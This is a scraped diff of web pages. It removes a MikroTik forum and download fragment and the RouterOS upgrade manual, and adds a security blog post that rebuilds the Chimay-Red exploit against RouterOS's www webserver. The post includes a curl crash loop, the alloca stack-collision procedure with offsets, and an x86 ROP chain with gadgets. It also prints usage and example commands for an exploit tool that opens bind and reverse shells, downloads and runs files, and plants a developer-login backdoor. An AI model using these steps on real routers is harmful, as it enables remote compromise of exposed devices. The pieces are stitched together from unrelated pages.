-SwOS
-Training
-Home
-Forum index
-RouterOS
-Beginner Basics
-Delete all board cookies
-The team
-Delete all board cookies
-The team
-Powered by phpBB® Forum Software © phpBB Limited
-Design by SlickThemes
-×
 ===============https://mikrotik.com/download/archive================
 MikroTik Routers and Wireless - Software
 HomeAboutBuyJobsHardwareSoftwareSupportTrainingAccount
@@ -7227,164 +6077,606 @@ Click Here
 Sign up for the newsletter
 Please sign up to get notified about new RouterOS version releases and other useful information!
 MikroTik app
-===============https://wiki.mikrotik.com/wiki/Manual:Upgrading_RouterOS================
-Manual:Upgrading RouterOS - MikroTik Wiki
-Manual:Upgrading RouterOS
-From MikroTik Wiki
-Jump to:					navigation, 					search
-It is suggested to always keep your RouterOS installation up to date, MikroTik always keeps adding new functionality and improving performance and stability by releasing updates.
-Contents
-1 Automatic upgrade
-2 RouterOS version release chains
-3 Manual upgrade methods
-4 Upgrade process
-4.1 Using Winbox
-4.2 Using FTP
-5 RouterOS massive auto-upgrade
-5.1 RouterOS auto-upgrade
-5.2 The Dude auto-upgrade
-5.3 The Dude hierarchical upgrade
-6 License issues
-7 Version numbering
-8 Suggestions
-Automatic upgrade
-The automatic upgrade feature connects to the MikroTik download servers, and checks if there is a new RouterOS version for your device. If yes, a changelog is displayed, and Upgrade button is shown. Clicking the upgrade button, software packages are automatically downloaded, and device will be rebooted. Even if you have a custom set of packages installed, only the correct packages will be downloaded.
-Note:
-If you are running v5.25 or older, the system will only auto-upgrade to the most recent version of the v5 major version release and not up to v6.20. Manual upgrade is needed in this case.
-Upgrade button in QuickSet:
-Upgrade button in the Packages menu:
-After clicking the Upgrade button, Changelog is shown:
-By clicking "Download & Upgrade", downloads will start, and router will reboot. After the reboot, your router will be running the latest RouterOS version. You can then click the Upgrade button again, to confirm that your router is running the latest RouterOS.
-RouterOS version release chains
-When upgrading RouterOS, you can choose a release chain from which to install the new packages. For mission critical installations, bugfixes-only release chain is suggested, as it does not include freshly added new features and is kept for a long time on the download page, with only critical fixes applied to it.
-Bugfixed-only version is the most stable release without new features, just most important fixes. Updated rarely, only when a critical issue is found in a bugfixes-only release.
-Current includes the same fixes plus improvements and new features. Once a current release has been tested for several months, it is promoted to bugfix-only and is no longer updated with features.
-Release candidate released a few times per week. Includes newest features, released without intensive testing. Not recommended for production.
-Note:
-Since RouterOS v6.44beta6 release channels have been renamed - "bugfix" to "long-term", "current" to "stable" and "release candidate" to "testing".
-Manual upgrade methods
-You can upgrade RouterOS in the following ways:
-Winbox – drag and drop files to the Files menu
-WebFig - upload files from Files menu
-FTP - upload files to root directory
-The Dude – See manual here
-Note: RouterOS cannot be upgraded through serial cable. Using this method only RouterBOOT can be upgraded.
-Upgrade process
-First step - visit www.mikrotik.com and head to the download page, there choose the type of system you have the RouterOS installed on.
-Download the Combined package, it will include all the functionality of RouterOS:
-Using Winbox
-Choose your system type, and download the upgrade package:
-Connect to your router with Winbox, Select the downloaded file with your mouse, and drag it to the Files menu. If there are some files already present, make sure to put the package in the root menu, not inside the hotspot folder!:
-The upload will start:
-After it finishes - REBOOT and that's all! The New version number will be seen in the Winbox Title and in the Packages menu
-Using FTP
-Open your favourite FTP program (in this case it is Filezilla), select the package and upload it to your router (demo2.mt.lv is the address of my router in this example). note that in the image I'm uploading many packages, but in your case - you will have one file that contains them all
-if you wish, you can check if the file is successfully transferred onto the router (optional):
-[normis@Demo_v2.9] > file print
-# NAME
-TYPE
-SIZE
-CREATION-TIME
-0 supout.rif
-.rif file
-285942
-nov/24/2005 15:21:54
-1 dhcp-2.9.8.npk
-package
-138846
-nov/29/2005 09:55:42
-2 ppp-2.9.8.npk
-package
-328636
-nov/29/2005 09:55:43
-3 advanced-tools-2.9.... package
-142820
-nov/29/2005 09:55:42
-4 web-proxy-2.9.8.npk
-package
-377837
-nov/29/2005 09:55:43
-5 wireless-2.9.8.npk
-package
-534052
-nov/29/2005 09:55:43
-6 routerboard-2.9.8.npk
-package
-192628
-nov/29/2005 09:55:45
-7 system-2.9.8.npk
-package
-5826498
-nov/29/2005 09:55:54
-and reboot your router for the upgrade process to begin:
-[normis@Demo_v2.9] > system reboot
-Reboot, yes? [y/N]: y
-after the reboot, your router will be up to date, you can check it in this menu:
-/system package print
-if your router did not upgrade correctly, make sure you check the log
-/log print without-paging
-RouterOS massive auto-upgrade
-You can upgrade multiple MikroTik routers within few clicks. Let's have a look on simple network with 3 routers (the same method works on networks with infinite numbers of routers),
-RouterOS auto-upgrade
-Sub-menu: /system package update
-RouterOS version 6 has new auto upgrade option. RouterOS checks amazon servers for information if new version is available and upgrades after upgrade command is executed.
-You can automate the upgrade process by running a script in the scheduler:
-After v6.31:
-/system package update
-check-for-updates once
-:delay 3s;
-:if ( [get status] = "New version is available") do={ install }
-Older options
-Until v6.31:
-/system package update
-check-for-updates
-:delay 3s;
-:if ( [get current-version] != [get latest-version]) do={ upgrade }
-RouterOS can download software packages from a remote MikroTik router.
-Make one router as network upgrade central point, that will update MikroTik RouterOS on other routers.
-Upload necessary RouterOS packages to this router (in the example, mipsbe for RB751U and powerpc for RB1100AHx2).
-Add upgrade router (192.168.100.1) information to a router that you want to update (192.168.100.253), required settings IP address/Username/Password
-Click on Refresh to see available packages, download newest packages and reboot the router to finalize the upgrade.
-The Dude auto-upgrade
-Dude application can help you to upgrade entire RouterOS network with one click per router.
-Set type RouterOS and correct password for any device on your Dude map, that you want to upgrade automatically,
-Upload required RouterOS packages to Dude files,
-Upgrade RouterOS version on devices from RouterOS list. Upgrade process is automatic, after click on upgrade (or force upgrade), package will be uploaded and router will be rebooted by the Dude automatically.
-The Dude hierarchical upgrade
-For complicated networks, when routers are connected sequentially, the simplest example is 1router-2router-3router connection. You might get an issue, 2router will go to reboot before packages are uploaded to the 3router. The solution is Dude groups, the feature allows to group routers and upgrade all of them by one click!
-Select group and click Upgrade (or Force Upgrade),
-License issues
-When upgrading from older versions, there could be issues with your license key. Possible scenarios:
-When upgrading from RouterOS v2.8 or older, the system might complain about expired upgrade time. To override this, use Netinstall to upgrade. Netinstall will ignore old license restriction and will upgrade
-When upgrading to RouterOS v4 or newer, the system will ask you to update license to a new format. To do this, ensure your Winbox PC (not the router) has a working internet connection without any restrictions to reach www.mikrotik.com and click "update license" in the license menu.
-Version numbering
-RouterOS versions are numbered sequentially, when a period is used to separate sequences, it does not represent a decimal point, and the sequences do not have positional significance. An identifier of 2.5, for instance, is not "two and a half" or "half way to version three", it is the fifth second-level revision of the second first-level revision. Therefore v5.2 is older than v5.18, which is newer.
-RouterOS versions are released in several "release chains": Long-term, Stable and Beta.
-Beta: Released every few days, only undergoes basic internal testing, should not be used in production
-Stable: Released every few weeks, includes all tested features and fixes
-Long term: Released rarely, and includes only the most important fixes, upgrades within one number branch not add new features. When a Stable release has been out for a while and seems to be stable enough, it gets promoted into the Long Term branch, replacing an older release, which is then moved to Archive. This consecutively adds new features.
-Suggestions
-When using a RouterBOARD device, it is always suggested to upgrade it's RouterBOOT bootloader after RouterOS is upgraded. To do this, issue the command "/system routerboard upgrade"
-Retrieved from "https://wiki.mikrotik.com/index.php?title=Manual:Upgrading_RouterOS&oldid=32600"
-Categories: ManualSystemCase StudiesBasicInstall
-Navigation menu
-Personal tools
-Log in
-Namespaces
-Manual
-Discussion
-Variants
-Views
-Read
-View source
-View history
-More
-Search
-Navigation
-Main PageRecent changes
-Tools
-What links hereRelated changesSpecial pagesPrintable versionPermanent linkPage information
-This page was last edited on 4 January 2019, at 13:40.
-Privacy policy
-About MikroTik Wiki
-Disclaimers
+===============https://blog.seekintoo.com/chimay-red.html================
+Chimay-Red
+Seekintoo: blog
+seekintoo.com
+arcsight
+careers
+ctf
+research
+Chimay-Red
+Sat 28 April 2018
+By
+Dayton
+This post outlines and presents the rediscovery, vulnerability analysis and exploitation of a zero-day vulnerability that was
+originally discovered and exploited by the CIA's "Engineering Development Group"; remotely targeting MikroTik's RouterOS
+embedded operating system that was discovered during the "Vault 7" leak via WikiLeaks in March of 2017.
+Brief History and Background
+MikroTik (MK) is a Latvian company founded in 1996 and is known for its routers, switches and wireless network equipment.
+MikroTik is primarily famous for its embedded routing OS/hardware ecosystem: RouterOS and RouterBOARD.
+RouterOS is a uClibC Linux 3.3.5 based embedded OS with a proprietary software based routing suite and tool set written in C++ called "NOVA", and is MK's OS for nearly all of their hardware routing - switching products.
+RouterOS was originally designed for running on the RouterBOARD line of products, but as of the last few years, MK has opened the ability to run RouterOS on any almost any x86 hypervisor, baremetal x86 and more recently a AWS cloud offering.
+What really makes RouterOS and RouterBOARD an attractive option for many is its price point versus the competition with comparable performance and often extra features. A Cisco switch supporting MPLS will run you a few thousand dollars, while the competing MK offering with MPLS is 4x cheaper on average. Although managing an advanced configuration of RouterOS can be a bit of a curve if you are not familiar with systems like Cisco's IOS
+Note: The NOVA suite will not run outside of RouterOS (Eg. docker container) without serious hacks, which I will show in a later post. Having done this has opened up an easier method for exploit fuzzing and testing across many architectures and versions using QEMU or other instrumentable architecture virtualization.
+RouterBOARD 850gx3
+Plausible causes of interest (speculation)
+Why might the CIA be interested in exploiting these devices? Well for starters at any given time, between 1,500,000 and 2,000,000 MK RouterOS devices are exposed on the public net, as seen via shodan.io. These figures are on par with Cisco's exposure numbers and typically three times more exposed than D-Link and other usual suspects.
+Censys additionally reports that around 50,000 RouterOS devices currently have the HTTP management interface exposed to the public net. Top RouterOS device host countries include (in-order): Brazil, China, Indonesia and Russia.
+shodan.io device map: 1 == 1000 devices
+In combination with MK's current deployed scale globally and population in known targeted countries it seems reasonable that MK would be a prime candidate for such exploit development by a nation state. Similarly, found within the leaks is documentation for an exploit kit that compromises the AVTech Network Video Recorder code-named "Mealybug". As of posting this article, AVTech devices are the second most popular shodan search term, with around 130,000 results worldwide; Further re-enforcing the idea that the CIA has interest in developing exploits for very popular consumer hardware.
+Kaspersky also shows claims that tooling to exploit MK has been around "for a long time", as seen in the "Slingshot" APT report FAQ published this year.
+Vault 7
+Vault 7 aka. "Year Zero" was a mega-dump of approximately 23 projects and other various artifacts on Tuesday March 7th, 2017 from the CIA's Engineering Development Group (EDG) division at the Center for Cyber Intelligence (CCI)), a special development branch belonging to the CIA's Directorate for Digital Innovation (DDI) in Langley, Virginia.
+Comprising 8,761 documents and files, the leaks detailed abilities to compromise cars, smart TVs, browsers, phones and operating systems. Most, if not all, leaked projects were developed to preform electronic surveillance and/or cyber-warfare. Although no vulnerability sources or binaries were released, the leaked documentation has given attackers significant direction in rediscovering many of the same exploits.
+The Engineering Development Group is responsible for building certain notable tools as discovered in the leaks, such as: Hive, Cutthroat, Chimay-Red, Dark Matter, and Sonic Screwdriver. These tools were distributed to operators and partners when conducting proxy cyber-activities in regions where the US may face legal issues the partner state does not have as stringent laws against.
+Chimay-Red
+Background
+Chimay-Red is a zero-day exploit for the HTTP management/configuration/proxy webserver called www in MK RouterOS versions 6.x, originally targeting MIPS, MIPSEL, PPC, and x86 architectures. The exploit abuses a multithreaded remote stack collision vulnerability due to an implementation error with the usage of the compiler built-in alloca() by "allocating" a untrusted remotely supplied size value during a content-length header check. It is believed that Chimay-Red was originally used to implant HIVE or TinyShell onto the target system, as noted in the "hive-UsersGuide.pdf" document under: "7.1 (S) Installing Hive on MikroTik MIPS RouterOS 6.x using Chimay-Red".
+Documentation and version release notes suggest that development of the exploit was completed around 07/2015 (pg. 29 hive-UsersGuide.pdf):
+V2.9 (07/01/2015)
+• Adds a user-defined directory path for the .config and .log files to avoid read-only memory.
+• Adds support for MikroTik 6.x.
+Also found within hive-UsersGuide.pdf pg. 23 and image2015-4-27%2010:46:48.png is usage and other interesting information about Chimay-Red's inner workings:
+Exploit Usage:
+Operator usage Python traceback screenshot:
+Notice the hierarchy of the traceback from the Python interpreter. Arguments are passed into the entrypoint, which chooses the exploit module within ChimayRed_v3.7/bin/libs/<arch>/Exploit.py based off of detected or selected architecture and throws the payload in the given module to the given host and port.
+The throw_v6() (exploit version 6.x) function seems to use multiple sockets and predetermined or at least stored content-length and content values to some HTTP POST-able endpoint, which is a interesting hint towards where we might find this bug in the webserver binary.
+Unfortunately, due to the lack of information available within the leaks pertaining the Chimay-Red exploit, I was not unable to recover any more useful background or hints. However, I was confident that I had learned enough to tackle exploiting the vulnerability myself.
+Chimay-Red (my turn)
+Up to the challenge to try and see if I could match what these vulnerability researchers had accomplished in secret and more, I was excited to get started hunting. I had a couple other things going for me as well at the time, some MK MIPS based devices on-hand, the Python traceback screenshot and manuals from the leaks and a patched version of RouterOS released by MK fixing the said vulnerability:
+MK 6.38.5 release notes - link
+Initial Goals
+I didn't just want to replicate the exploit exactly, I wanted to make it even better. So I created a set of requirements for myself of what I think my version of the exploit should accomplish.
+The replica exploit will:
+At minimum, conform to the operators usage guide.
+Support the same architectures and commands.
+Note: Specific supported 6.x versions are unknown via the leaks.
+The replica exploit should:
+Support all 6.x versions and architectures
+Tooling for enumerating, downloading, analyzing and cataloging system firmware
+Needed for building ROP-chains and store metadata for approx ~200 different FW versions
+Containerize and optionally emulate any system firmware for fuzzing and testing.
+On The Hunt
+Extracting FW images:
+Binwalk can help us make quick work of identifying magic bytes within the firmware files in-order to extract the root SquashFS filesystem.
+$ binwalk -e ./routeros-<architecture>-<version>.npk ./routeros-<architecture>-<version>.npk
+4096
+0x1000
+Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7109576 bytes, 1034 inodes, blocksize: 262144 bytes, created: 2016-10-05 12:07:28
+Webserver Binary Location:
+$ find $firmware-images.extracted/squashfs-root -name "www" -type f
+firmware-images.extracted/squashfs-root/nova/bin/www
+$ file $firmware-images.extracted/squashfs-root/nova/bin/www
+www: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+WWW Reverse Engineering Notes
+Full reverse engineering analysis of the www webserver binary is outside the scope of this post. Although I will provide some important notes:
+One thread per socket connection.
+Each connection is allocated 128KiB (0x20000) of stack space per thread
+This is set by pthread_attr_setstacksize in main()
+Each thread stack space is allocated ontop on the previous thread.
+|
+|
+^-------------^ < Thread2 ESP
+|
+|
+|
+|
+|
+Thread1
+|
+|
+|
+^-------------^ < Thread1 ESP
+|
+|
+|
+|
+|
+Thread0
+|
+|
+|
+^-------------^ < Thread0 ESP
+Automatically restarted on crash after three seconds
+The loader arbiter (/nova/bin/loader) controls this via signal handling and PID tracking.
+ELF Mitigations:
+Architecture
+NX
+CANARY
+PIE
+RELRO
+x86
+YES
+NO
+NO
+NO
+ARM
+YES
+NO
+NO
+NO
+POWERPC
+YES
+NO
+NO
+NO
+SMIPS
+NO
+NO
+NO
+NO
+MMIPS
+NO
+NO
+NO
+NO
+MIPSBE
+NO
+NO
+NO
+NO
+TILE
+NO
+NO
+NO
+NO
+Analyzing the difference with IDA and BinDiff
+By looking at the difference in the assembled sections of the binary of the known vulnerable version and the known fixed version gave a clear look into what exactly has been patched to fix the vulnerability.
+Note: A good BinDiff trick is to look for lowest similarity with high confidence
+6.38.4 versus 6.38.5 BinDiff subroutine similarity chart
+It appears Request::readPostData(int32_t arg1, int32_t arg2) would be a prime candidate to diff due it being the function with the highest confidence rating of a altered subroutine at a score of "0.82".
+Left: 6.38.4 (x86) | Right: 6.38.5 (x86)
+I could not get IDA to produce psuedocode for the subroutine, so instead I have hand written it below (correct me if wrong, please):
+int header;
+int recv_len;
+int *alloca_sp
+int content_length_value = 0;
+char *content_length;
+// Block until request received
+recv_len = sock::recv(32768);
+// Set the name of the header we are looking for
+string::string(&content_length, "content_length");
+// Grab given header_name given the raw request.
+header = Headers::getHeader(&content_length, &content_length_value);
+if (!header) {
+goto exit;
+} else if (recv_len == 0) {
+goto exit;
+} else if (recv_len < content_length_value) {
+goto exit;
+}
+// Stack colision vulnerability due to insufficient content_length_value filtering as seen above.
+// This call is optimized to "sub eax, esp" with most compilers.
+alloca_sp = alloca(content_length_value);
+// Read content_length_value bytes from socket and write
+// into newly likely improperly allocated stack space. (SIGSEGV)
+istream::read(alloca_sp, content_length_value)
+So what's the vulnerability?
+Since no filtering/conditionals are happening to ensure that the content-length_value does not exceed the thread stack page size limits, the vulnerability could be triggered by passing a negative number into the content-length header. This results in a alloca() *size argument far exceeding the size of the current connection thread stack frame size of 128KiB during a logical AND of the size value to enforce stack alignment.
+alloca() in-lined assembly snippet from readPostData():
+8055a56:
+8d 42 10
+lea
+eax,[edx+0x10] << load effectively content_length_value from edx+0x10 into eax
+8055a59:
+83 e0 f0
+and
+eax,0xfffffff0 << AND content_length_value to enforce stack alignment at mutliples of 16 bytes
+8055a5c:
+29 c4
+sub
+esp,eax
+<< "allocate" space by subtracting the stack pointer (esp) by content_legth_value
+Example alloca() alignment in Python:
+>>> content_length_value = -1
+>>> (content_length_value - 0x10) & 0xFFFFFFF0
+4294967264
+As you can see in the example alignment calculation, due to the logical AND preformed on the content_length_value to enforce the stacksize to be in alignment with STACK_ALIGN (16 bytes on most architectures), an integer overflow has occurred. This will cause alloca() to attempt to subtract the stack pointer by a massive amount, exhausting additional thread stack space causing the webserver to SIGSEGV when that unallocated memory is improperly accessed during the next threaded connection or by other arbitrary access.
+The patched version ensures no such overlaps can occur by first validating the content_length_value and resizing before reaching alloca().
+Identifying a POST method URL endpoint on the webserver:
+To discover a URL endpoint on the webserver that I could actually POST arbitrary data into, I fired up WireShark and browsed to the login page of the management server and logged in. This shows a POST endpoint available in the working directory called /jsproxy:
+PoC ()
+At this point we should have a proof of concept that we can use to test if the target webserver crashes. Simply passing a negative one into the content_length header should be enough
+to wrap the integer and overallocate to crash the server. To test, we can craft this header with CURL in a POST request and spam the webserver with it in a loop :).
+CURL PoC:
+while ; do curl -X POST -H "Content-Length: -1" -d '{"foo":"bar"}' http://<target>:80/jsproxy && sleep 0.5; done
+ASCIInema PoC demo:
+As you can see, the webserver crashes and is automatically restarted every three seconds.
+Building the Exploit
+For a test target, I just installed RouterOS within VirtualBox and bound the first interface to a host-only adapter. I won't be covering this in particular, in-depth instructions can be found on Google.
+Most of the tools I used in this section and recommend others to use for embedded Linux exploit development/research:
+pwntools
+MIPSROP
+GDB
+GDB PEDA
+GEF
+Binutils Collection
+Getting a debugger on the target
+I'm going to need a debugger on my target in-order to further understand and analyze the crash before going any further.
+This is a fairly simple and straightforward process thanks to MK enabling something called devel-login, which will allow us to gain a root shell.
+Mount both partitions from RouterOS Virtual Disk
+$ mount /dev/sda1 /mnt/disk1
+$ mount /dev/sda2 /mnt/disk2
+Create a file called devel-login in /dev/disk2/etc/
+$ touch /dev/disk2/etc/devel-login
+Copy uClibC compiled gdbserver to /mnt/disk1/flash/bin
+$ cp ./gdbserver /mnt/disk/flash/bin
+Connect over telnet to target and login as devel-login, blank password:
+MikroTik 6.38.4 (stable)
+MikroTik Login: devel-login
+Password:
+BusyBox v1.00 (2017.03.02-08:29+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+#
+Run the gdbserver previously copied into /flash/bin/gdbserver.i686:
+$ /flash/bin/gdbserver 0.0.0.0:4444 --attach $(pidof www)
+You can now do remote debugging with GDB:
+$ gdb -q
+gdb-peda$ target remote 192.168.56.124:4444
+Exploit Building Preconditions and Requirements
+To avoid NX (non-executable) memory protections and ASLR (Address-Space-Layout-Randomization) on (x86, ARM, POWERPC), typical return-oriented techniques can be employed to reuse existing executable memory once execution flow via the IP (Instruction Pointer) is controlled. Therefore on systems without NX applied (MIPS* and TILE); NX does not need to be bypassed and has the ability to execute code on the stack. For my purposes I will be using a ROP (Return-Oriented-Programming) chain every time for every architecture regardless.
+Why? Because why not? ROP chains work on both systems with and without NX protections, can't hurt ¯_(ツ)_/¯.
+But what this still means is the attacker (me) must have the target version of webserver (www) present to gather instruction offsets for ROP. This is where MikroDB comes in as you will see shortly in the post.
+Detecting architecture remotely
+Architecture is discovered remotely via a protocol called MNDP (MikroTik Neighbor Discovery Protocol).
+MNDP
+The MikroTik Neighbor Discovery Protocol (MNDP) eases network configuration and management
+by enabling each MikroTik router to discover other connected MikroTik routers and learn
+information about the system along with features which are enabled. The MikroTik routers
+can automatically use learned information to set up some features with minimal or no configuration.
+MNDP features:
+works on IP level connections
+works on all non-dynamic interfaces
+distributes basic information on the software version
+distributes information on configured features that should interoperate with other MikroTik routers
+The type of information usually associated with MNDP packets are:
+age
+address
+identity
+interface(s)
+mac-address
+platform
+software-id
+unpack version
+uptime,
+hardware info
+To take use of MNDP for detecting the target architecture, its usage is simplified as so:
+Send four null bytes ('\0\0\0\0') to 255.255.255.255:5678.
+Wait a little while.
+Receive information back on 0.0.0.0:5678.
+Detecting version remotely
+Detecting the remote version is simple for majority of the exposed services.
+Here's a few:
+HTTP
+Version string in HTML GET request data from maintenance webpage
+FTP
+Version string in banner
+220 MikroTik FTP server (MikroTik 6.38.4) ready
+TELNET
+Version string in banner
+MikroTik v6.38.4 (stable)
+MNDP
+Version string in version entry within MNDP packet.
+The obvious caveat of using MNDP to retrieve this information, is that the attacker is required to be within the targets subnet.
+Abusing alloca(); a multithreaded tango
+man 3 alloca:
+void *alloca(size_t size)
+...
+The
+alloca() function allocates size bytes of space in the stack frame of the caller.
+If the allocation causes stack overflow, program behavior is undefined.
+The procedure is as follows:
+Two socket connections to the webserver are established, causing www to create two threads to handle the connections. Both threads are expecting HTTP headers and so they are both blocking on a read operation.
+Note: Gray represents the space already taken up on the stack for existing data.
+Thread1 is sent HTTP headers with an HTTP Content-Length string equivalent to 0x29000 (THREAD_STACK_SIZE + len(payload) + SAFE_SPACE). Once headers are received, Thread1's initial read operation finishes. It performs the alloca, subtracting its stack pointer by 0x29000, which places its pointer for *buf at 0x8000 bytes down from the top of Thread2's stack:
+Thread1 is then sent approximately 0x1000 bytes of the 0x29000 it is expecting alligned for istream::read(). This advances the *buf pointer index used by istream::read() up the stack, closer to Thread2's current stack pointer. Thread1 continues waiting as it has not yet received the full amount of data expected (0x29000).
+Thread2, still waiting on its initial network read, is sent HTTP POST headers with a Content-Length string equivalent to approximately the size of the payload (0x8000 as an example), which it uses for its own alloca, subtracting from its stack pointer. Coordinating this length carefully places it precisely where the *buf pointer in Thread1 istream::read() currently points, in the below diagram I have placed it just above so it's visible. Thread2 then calls istream::read() to receive its HTTP Content-Data, causing it to block while waiting to read in data.
+Thread1 is then sent the payload data it is waiting to receive, which is stored starting at its current *buf index in istream::read(), and overwrites where Thread2's stored return address is for istream::read().
+A return from istream::read() can then be triggered by simply closing the connection. Once Thread2 returns, EIP is restored from the overwritten return address value and execution flow is controlled.
+return address overwrite calculation eg:
+ADDR_SIZE = 8
+SAFE_SPACE = 0x1000
+THREAD_STACK_SIZE = 0x20000
+PAYLOAD_LEN = len(payload) # 0x8000
+>>> hex(((THREAD_STACK_SIZE + SAFE_SPACE + PAYLOAD_LEN) - PAYLOAD_LEN) - ((SAFE_SPACE - 0x10) & 0xFFFFFFF0) - ADDR_SIZE)
+'0x20008'
+ROP
+Note: I'll only be explaining the ROP technique for the x86 architecture, as explaining all the techniques would be a blog post in itself. This technique was originally discovered by GitHub user wxsarcher for RouterOS 6.x at BigNerd's version of Chimay-Red. At the time of researching this vulnerability I was not aware of the efforts by BigNerd to also uncover the bug, so big props to BigNerd for being the first (that I can see) to release a working PoC for Chimay-Red! I recommend everyone go and checkout his exploit stuff for Chimay-Red as well, and if you can help him support more architectures, the project is in need of additional architecture research.
+Psuedocode for technique to execute: ls -la
+system_chunks = [134512899, 134513152, 134512899, 134512854, 134514868, 134514240, 134512693]
+#
+("s", "y", "s", "t", "e", "m", "\x00")
+cmd_chunks = [134512885, 134512899, 134512682, 134512891, 134512885, 134516284, 134512693]
+#
+("l", "s", " ", "-", "l", "a", "\x00")
+writable_segment_addr = 134514680
+jmp_eax = 134514248
+char_size = 1
+command = bytes()
+char_pointer = 0
+for address in system_chunks:
+command += rop.call(<strncpy>, args=(<writeable_segment_addr> + char_pointer, address, char_size))
+char_pointer += 1
+system = bytes()
+char_pointer = 0
+for address in cmd_chunks:
+system += rop.call(<strncpy>, args=((<writeable_segment_addr> + (len(system_chunks) + addr_size) + char_pointer, address, char_size))
+char_pointer += 1
+|<<<< rop.call(<dlsym>, args=(0, system))
+|
+|
+Note: [EAX] = resultant pointer of dlsym() call
+|
+|>>>> rop.call(jmp_eax, args=(command,))
+What it do?
+First finds the address of a readable character for each character in the string "system\x00" and our desired command + "\x00" to be run by system().
+Next a writeable_segment_addr in the binary address ranges is searched for to be able to write x amount of characters to via strncpy(), (commonly the bss section is used) where x == len("system\x00"+command+"\x00")
+system_chunks character addresses are then written to the writeable_segment_addr using strncpy(), incrementing the writeable_segment_addr - char_pointer counter value each time a character is written.
+command_chunks character addresses are then written to (writeable_segment_addr + len("system\x00") + addr_size)
+dlsym() in the binary PLT entry table is then called with the target symbol being the original writeable_segment_addr which should be pointing to >
+"system\0"
+The result of the call to dlsym() now should be a pointer to the system() function. This pointer is returned in EAX and jumped to with a jmp eax gadget with its argument register (EBP) set to (writeable_segment_addr + len("system\x00") + addr_size) which should be pointing to > "ls -la\0"
+Produced gadgets:
+Writing "system\0":
+0x0000:
+strncpy strncpy(134594588, 134512899, 1)
+0x0004:
+0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
+0x0008:
+0x805c01c arg0
+0x000c:
+0x8048103 arg1
+0x0010:
+0x1 arg2
+<snip>
+Writing "ls -la\0":
+0x008c:
+strncpy strncpy(134594604, 134512885, 1)
+0x0090:
+0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
+0x0094:
+0x805c02c arg0
+0x0098:
+0x80480f5 arg1
+0x009c:
+0x1 arg2
+<snip>
+Calling dlsym() & jmp_eax():
+0x0118:
+dlsym dlsym(0, 134594588)
+0x011c:
+0x804ffd9 <adjust: pop ebx; pop ebp; ret>
+0x0120:
+0x0 arg0
+0x0124:
+0x805c01c arg1
+0x0128:
+jmp_eax jmp_eax(134594604)
+0x012c:
+b'zaad' <pad>
+0x0130:
+0x805c02c arg0
+Result:
+system("ls -la")
+Once the ROP chain has been built and packed for the given endianess, it can be sent during the payload stage as seen in the earlier procedure when abusing alloca(). Each gadget in the chain should be executed thanks to our return address overwrite earlier.
+MikroDB
+MikroDB is a sister application to Chimay-Red that allows easier portability and extendability of the exploit toolkit. its what allows hundreds of different types of ROP chains to be built without having access to the target binary itself; and it does this through a process like so:
+Enumerates all stable vulnerable RouterOS 6.x versions available for download from MK's archive for all architectures by bruteforcing version numbers via HEAD requests.
+Downloads all enumerated firmware images into a storage directory.
+Catalogs the filename and SHA256 hash of the firmware file into a local SQLite database file.
+Decompresses and extracts the webserver binary www from the SquashFS filesystem stored within NPK firmware image.
+Stores and catalogs the filename and SHA256 hash of the www webserver binary into the SQLite database file.
+For each webserver binary extracted, the file is ran through a ROP chain building process and information for building selected ROP-chain repeatably is stored in the SQLite database file.
+Once MikroDB is finished its process, it can be portably used with Chimay-Red to build ROP-chains on the fly thanks to the stored offsets in the database, instead of downloading and extracting and storing 5GB+ of FW images in-order to facilitate attacking any version and architecture. This 500KB database can be built once in only a couple hours and kept forever. For your convenience, a prebuilt database is included in the source code repository for this project!
+MikroDB was able to enumerate 352 vulnerable versions (as of writing this, it fluctuates oddly..) across all of their supported architectures, a table is represented below showing vulnerable versions available per architecture:
+Architecture
+# Vulnerable versions
+x86
+56
+ARM
+45
+POWERPC
+57
+SMIPS
+56
+MMIPS
+25
+MIPSBE
+57
+TILE
+56
+MikroDB in action against x86: (skip through)
+Wrapping it all together
+Usage:
+usage: chimay_red.py [-h] -t TARGET [-s] [-d] [--architecture ARCHITECTURE]
+[--gdbport GDBPORT] [--binary BINARY]
+[--shellcode SHELLCODE] [--vector VECTOR]
+[--leakrounds LEAKROUNDS] [-v] [--version]
+command
+positional arguments:
+command
+command function to run on target, see below for
+options
+optional arguments:
+-h, --help
+show this help message and exit
+-t TARGET, --target TARGET
+target address:port
+-l LHOST, --lhost LHOST
+local address to bind to for listening for connectback commands
+-s, --shell
+return interactive shell as main payload (default)
+-d, --debug
+enable debugging mode
+--architecture ARCHITECTURE
+target architecture (will detect automatically if
+target in route table range)
+--gdbport GDBPORT
+port to use when connecting to remote gdbserver
+--binary BINARY
+target binary (www)
+--shellcode SHELLCODE
+custom (optional) shellcode payload binary filepath
+--vector VECTOR
+optional vector type, see below for options
+--leakrounds LEAKROUNDS
+amount of rounds to leak pointers, higher is better,
+but takes more time
+-v, --verbose
+Verbosity mode
+--version
+show program's version number and exit
+commands:
+COMMAND
+FUNCTION
+bindshell
+create a bindshell
+connectback
+create a reverse shell
+download_and_exe
+connect back and download a file to then execute
+ssl_download_and_exe
+connect back and download a file via SSL to then execute
+write_devel
+write "devel-login" file to allow developer account login
+write_devel_read_userfile
+in addition to enabling developer logins, read back the users file
+custom_shellcode
+run arbitrary shellcode from `--shellcode` binfile
+custom_shell_command
+run a arbitrary $sh one liner on the target
+vectors:
+default: (mikrodb)
+[Generic]
+mikrodb:
+use the accompanying mikrodb database to load offsets
+based off of detected remote version to build a ROP chain.
+build:
+build a ROP chain from scratch given the www binary matching
+the remote version running.
+[Experimental]
+brute: bruteforce uclibc base offset.
+leak:
+leak pointers from shared libraries to give better odds of
+finding base offset of uclibc.
+examples:
+./chimay_red.py connectback --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=mikrodb
+./chimay_red.py connectback -d --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=build
+--binary $PWD/www --gdbport 4444
+==================================================
+|
+_______
+_
+___
+__|
+| / ___/ /
+(_)_ _
+___ ___ ______/ _ \___ ___/ /|
+|/ /__/ _ \/ /
+' \/ _ `/ // /___/ , _/ -_) _
+/ |
+|\___/_//_/_/_/_/_/\_,_/\_, /
+/_/|_|\__/\_,_/
+|
+|
+/___/
+|
+==================================================
+Additional tips & tricks
